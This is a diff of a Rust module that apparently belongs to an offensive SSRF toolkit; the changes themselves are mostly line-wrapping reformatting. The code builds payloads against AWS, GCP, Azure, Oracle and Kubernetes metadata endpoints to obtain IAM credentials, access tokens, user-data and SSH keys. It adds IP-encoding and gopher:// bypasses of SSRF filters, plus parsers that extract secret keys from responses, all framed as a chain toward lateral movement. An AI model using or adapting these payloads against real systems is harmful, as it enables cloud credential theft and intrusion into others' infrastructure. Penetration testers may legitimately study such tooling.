@@ -7,7 +7,7 @@ use std::net::Ipv4Addr;
 /// The attack chain: discover SSRF → enumerate cloud metadata → extract
 /// credentials → use credentials for lateral movement. This module
 /// generates the complete payload set and parses responses at each stage.
-
+///
 /// Cloud provider whose metadata service we're targeting.
 #[derive(Debug, Clone, Copy, PartialEq, Eq, Hash)]
 pub enum CloudProvider {
@@ -108,14 +108,26 @@ pub fn generate_metadata_payloads() -> Vec<SsrfPayload> {
 fn aws_metadata_payloads() -> Vec<SsrfPayload> {
     let base_paths = [
         ("/latest/meta-data/", "instance metadata root"),
-        ("/latest/meta-data/iam/security-credentials/", "IAM role listing"),
+        (
+            "/latest/meta-data/iam/security-credentials/",
+            "IAM role listing",
+        ),
         ("/latest/meta-data/iam/info", "IAM info"),
         ("/latest/meta-data/hostname", "internal hostname"),
         ("/latest/meta-data/local-ipv4", "internal IPv4"),
         ("/latest/meta-data/public-keys/", "SSH public keys"),
-        ("/latest/user-data", "instance user-data (may contain secrets)"),
-        ("/latest/dynamic/instance-identity/document", "instance identity"),
-        ("/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance", "EC2 instance creds"),
+        (
+            "/latest/user-data",
+            "instance user-data (may contain secrets)",
+        ),
+        (
+            "/latest/dynamic/instance-identity/document",
+            "instance identity",
+        ),
+        (
+            "/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance",
+            "EC2 instance creds",
+        ),
     ];
 
     let metadata_ip = "169.254.169.254";
@@ -132,15 +144,13 @@ fn aws_metadata_payloads() -> Vec<SsrfPayload> {
         .collect();
 
     payloads.push(SsrfPayload {
-        url: format!(
-            "http://{}/latest/api/token",
-            metadata_ip
-        ),
+        url: format!("http://{}/latest/api/token", metadata_ip),
         target: SsrfTarget::CloudMetadata(CloudProvider::Aws),
         bypass_technique: Some("IMDSv2 token request".to_string()),
-        required_headers: vec![
-            ("X-aws-ec2-metadata-token-ttl-seconds".to_string(), "21600".to_string()),
-        ],
+        required_headers: vec![(
+            "X-aws-ec2-metadata-token-ttl-seconds".to_string(),
+            "21600".to_string(),
+        )],
         description: "IMDSv2 token acquisition (PUT required)".to_string(),
     });
 
@@ -149,13 +159,28 @@ fn aws_metadata_payloads() -> Vec<SsrfPayload> {
 
 fn gcp_metadata_payloads() -> Vec<SsrfPayload> {
     let base_paths = [
-        ("/computeMetadata/v1/instance/service-accounts/default/token", "GCP access token"),
-        ("/computeMetadata/v1/instance/service-accounts/default/email", "service account email"),
-        ("/computeMetadata/v1/instance/service-accounts/default/scopes", "service account scopes"),
+        (
+            "/computeMetadata/v1/instance/service-accounts/default/token",
+            "GCP access token",
+        ),
+        (
+            "/computeMetadata/v1/instance/service-accounts/default/email",
+            "service account email",
+        ),
+        (
+            "/computeMetadata/v1/instance/service-accounts/default/scopes",
+            "service account scopes",
+        ),
         ("/computeMetadata/v1/project/project-id", "project ID"),
         ("/computeMetadata/v1/instance/hostname", "instance hostname"),
-        ("/computeMetadata/v1/instance/attributes/kube-env", "Kubernetes environment"),
-        ("/computeMetadata/v1/instance/attributes/ssh-keys", "SSH keys"),
+        (
+            "/computeMetadata/v1/instance/attributes/kube-env",
+            "Kubernetes environment",
+        ),
+        (
+            "/computeMetadata/v1/instance/attributes/ssh-keys",
+            "SSH keys",
+        ),
     ];
 
     base_paths
@@ -164,9 +189,7 @@ fn gcp_metadata_payloads() -> Vec<SsrfPayload> {
             url: format!("http://metadata.google.internal{}", path),
             target: SsrfTarget::CloudMetadata(CloudProvider::Gcp),
             bypass_technique: None,
-            required_headers: vec![
-                ("Metadata-Flavor".to_string(), "Google".to_string()),
-            ],
+            required_headers: vec![("Metadata-Flavor".to_string(), "Google".to_string())],
             description: desc.to_string(),
         })
         .collect()
@@ -186,9 +209,7 @@ fn azure_metadata_payloads() -> Vec<SsrfPayload> {
             url: format!("http://169.254.169.254{}", path),
             target: SsrfTarget::CloudMetadata(CloudProvider::Azure),
             bypass_technique: None,
-            required_headers: vec![
-                ("Metadata".to_string(), "true".to_string()),
-            ],
+            required_headers: vec![("Metadata".to_string(), "true".to_string())],
             description: desc.to_string(),
         })
         .collect()
@@ -233,17 +254,13 @@ fn alibaba_metadata_payloads() -> Vec<SsrfPayload> {
 }
 
 fn oracle_metadata_payloads() -> Vec<SsrfPayload> {
-    vec![
-        SsrfPayload {
-            url: "http://169.254.169.254/opc/v2/instance/".to_string(),
-            target: SsrfTarget::CloudMetadata(CloudProvider::Oracle),
-            bypass_technique: None,
-            required_headers: vec![
-                ("Authorization".to_string(), "Bearer Oracle".to_string()),
-            ],
-            description: "Oracle Cloud instance metadata".to_string(),
-        },
-    ]
+    vec![SsrfPayload {
+        url: "http://169.254.169.254/opc/v2/instance/".to_string(),
+        target: SsrfTarget::CloudMetadata(CloudProvider::Oracle),
+        bypass_technique: None,
+        required_headers: vec![("Authorization".to_string(), "Bearer Oracle".to_string())],
+        description: "Oracle Cloud instance metadata".to_string(),
+    }]
 }
 
 fn kubernetes_metadata_payloads() -> Vec<SsrfPayload> {
@@ -282,27 +299,37 @@ pub fn generate_ip_bypasses(ip: Ipv4Addr) -> Vec<String> {
 
     let decimal = u32::from(ip);
 
-    let hex = format!("0x{:02x}.0x{:02x}.0x{:02x}.0x{:02x}",
-        octets[0], octets[1], octets[2], octets[3]);
+    let hex = format!(
+        "0x{:02x}.0x{:02x}.0x{:02x}.0x{:02x}",
+        octets[0], octets[1], octets[2], octets[3]
+    );
 
     let hex_full = format!("0x{:08x}", decimal);
 
-    let octal = format!("0{:o}.0{:o}.0{:o}.0{:o}",
-        octets[0], octets[1], octets[2], octets[3]);
+    let octal = format!(
+        "0{:o}.0{:o}.0{:o}.0{:o}",
+        octets[0], octets[1], octets[2], octets[3]
+    );
 
-    let ipv6_mapped = format!("[::{}.{}.{}.{}]",
-        octets[0], octets[1], octets[2], octets[3]);
+    let ipv6_mapped = format!(
+        "[::{}.{}.{}.{}]",
+        octets[0], octets[1], octets[2], octets[3]
+    );
 
-    let ipv6_mapped_hex = format!("[::ffff:{:02x}{:02x}:{:02x}{:02x}]",
-        octets[0], octets[1], octets[2], octets[3]);
+    let ipv6_mapped_hex = format!(
+        "[::ffff:{:02x}{:02x}:{:02x}{:02x}]",
+        octets[0], octets[1], octets[2], octets[3]
+    );
 
-    let mixed_notation = format!("{}.{}.{}",
+    let mixed_notation = format!(
+        "{}.{}.{}",
         octets[0],
         octets[1],
         (octets[2] as u32) * 256 + octets[3] as u32,
     );
 
-    let two_part = format!("{}.{}",
+    let two_part = format!(
+        "{}.{}",
         octets[0],
         (octets[1] as u32) * 65536 + (octets[2] as u32) * 256 + octets[3] as u32,
     );
@@ -350,8 +377,10 @@ pub fn generate_scheme_payloads(internal_host: &str, path: &str) -> Vec<SsrfPayl
             description: "HTTPS (may bypass HTTP-only filters)".to_string(),
         },
         SsrfPayload {
-            url: format!("gopher://{}:80/_GET%20{}%20HTTP/1.1%0d%0aHost:%20{}%0d%0a%0d%0a",
-                internal_host, path, internal_host),
+            url: format!(
+                "gopher://{}:80/_GET%20{}%20HTTP/1.1%0d%0aHost:%20{}%0d%0a%0d%0a",
+                internal_host, path, internal_host
+            ),
             target: SsrfTarget::InternalService {
                 host: internal_host.to_string(),
                 port: 80,
@@ -396,8 +425,14 @@ pub fn extract_aws_credentials(response_body: &str) -> Option<AwsCredentials> {
 
     let access_key = v.get("AccessKeyId")?.as_str()?.to_string();
     let secret_key = v.get("SecretAccessKey")?.as_str()?.to_string();
-    let token = v.get("Token").and_then(|t| t.as_str()).map(|s| s.to_string());
-    let expiration = v.get("Expiration").and_then(|e| e.as_str()).map(|s| s.to_string());
+    let token = v
+        .get("Token")
+        .and_then(|t| t.as_str())
+        .map(|s| s.to_string());
+    let expiration = v
+        .get("Expiration")
+        .and_then(|e| e.as_str())
+        .map(|s| s.to_string());
 
     Some(AwsCredentials {
         access_key_id: access_key,
@@ -422,7 +457,10 @@ pub fn extract_gcp_token(response_body: &str) -> Option<GcpToken> {
 
     let access_token = v.get("access_token")?.as_str()?.to_string();
     let expires_in = v.get("expires_in").and_then(|e| e.as_u64());
-    let token_type = v.get("token_type").and_then(|t| t.as_str()).map(|s| s.to_string());
+    let token_type = v
+        .get("token_type")
+        .and_then(|t| t.as_str())
+        .map(|s| s.to_string());
 
     Some(GcpToken {
         access_token,
@@ -436,9 +474,18 @@ pub fn extract_azure_token(response_body: &str) -> Option<AzureToken> {
     let v: serde_json::Value = serde_json::from_str(response_body).ok()?;
 
     let access_token = v.get("access_token")?.as_str()?.to_string();
-    let token_type = v.get("token_type").and_then(|t| t.as_str()).map(|s| s.to_string());
-    let resource = v.get("resource").and_then(|r| r.as_str()).map(|s| s.to_string());
-    let expires_on = v.get("expires_on").and_then(|e| e.as_str()).map(|s| s.to_string());
+    let token_type = v
+        .get("token_type")
+        .and_then(|t| t.as_str())
+        .map(|s| s.to_string());
+    let resource = v
+        .get("resource")
+        .and_then(|r| r.as_str())
+        .map(|s| s.to_string());
+    let expires_on = v
+        .get("expires_on")
+        .and_then(|e| e.as_str())
+        .map(|s| s.to_string());
 
     Some(AzureToken {
         access_token,
@@ -558,27 +605,25 @@ pub fn detect_cloud_provider(response_body: &str) -> Option<CloudProvider> {
 /// Step 1: GET /latest/meta-data/iam/security-credentials/ → list role names
 /// Step 2: GET /latest/meta-data/iam/security-credentials/{role_name} → credentials JSON
 pub fn aws_credential_chain(role_name: &str) -> Vec<ChainStep> {
-    vec![
-        ChainStep {
-            stage: SsrfChainStage::CredentialExtraction,
-            payload: SsrfPayload {
-                url: format!(
-                    "http://169.254.169.254/latest/meta-data/iam/security-credentials/{}",
-                    role_name
-                ),
-                target: SsrfTarget::CloudMetadata(CloudProvider::Aws),
-                bypass_technique: None,
-                required_headers: Vec::new(),
-                description: format!("extract credentials for IAM role: {}", role_name),
-            },
-            expected_indicators: vec![
-                "AccessKeyId".to_string(),
-                "SecretAccessKey".to_string(),
-                "Token".to_string(),
-            ],
-            next_step_generator: Some("lateral_movement".to_string()),
+    vec![ChainStep {
+        stage: SsrfChainStage::CredentialExtraction,
+        payload: SsrfPayload {
+            url: format!(
+                "http://169.254.169.254/latest/meta-data/iam/security-credentials/{}",
+                role_name
+            ),
+            target: SsrfTarget::CloudMetadata(CloudProvider::Aws),
+            bypass_technique: None,
+            required_headers: Vec::new(),
+            description: format!("extract credentials for IAM role: {}", role_name),
         },
-    ]
+        expected_indicators: vec![
+            "AccessKeyId".to_string(),
+            "SecretAccessKey".to_string(),
+            "Token".to_string(),
+        ],
+        next_step_generator: Some("lateral_movement".to_string()),
+    }]
 }
 
 /// Common internal services to probe via SSRF for lateral movement.
